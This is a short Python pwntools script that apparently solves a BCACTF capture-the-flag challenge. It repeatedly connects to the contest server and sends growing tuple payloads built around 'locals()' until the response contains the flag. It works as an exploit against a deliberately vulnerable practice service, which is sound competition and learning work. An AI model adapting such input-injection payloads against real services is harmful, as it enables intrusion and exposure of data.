from pwn import *

payload = '(locals(), '
end_payload = ')'

i = 1
while True:
    payload += '"", '
    final_payload = (payload + end_payload).encode()

    p = remote("challs.bcactf.com", 30335)

    p.recvuntil(b"message:")
    p.sendline(final_payload)
    received = b""
    while b"Deleted!" not in received and b"flag" not in received:
        received += p.recv(4096)
    if b"flag" in received:
        print(received)
        break

    p.close()

    i += 1
